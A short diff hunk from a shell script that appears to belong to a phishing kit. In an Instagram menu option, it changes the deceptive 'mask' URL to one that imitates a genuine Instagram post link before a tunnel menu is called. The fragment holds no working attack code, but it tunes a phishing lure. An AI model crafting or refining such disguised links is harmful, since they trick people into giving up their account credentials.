@@ -516,7 +516,7 @@ site_instagram() {
 	case $REPLY in 
 		1 | 01)
 			website="instagram"
-			mask='http://get-unlimited-followers-for-instagram'
+			mask='http://instagram-1231352525345389-post-media'
 			tunnel_menu;;
 		2 | 02)
 			website="ig_followers"
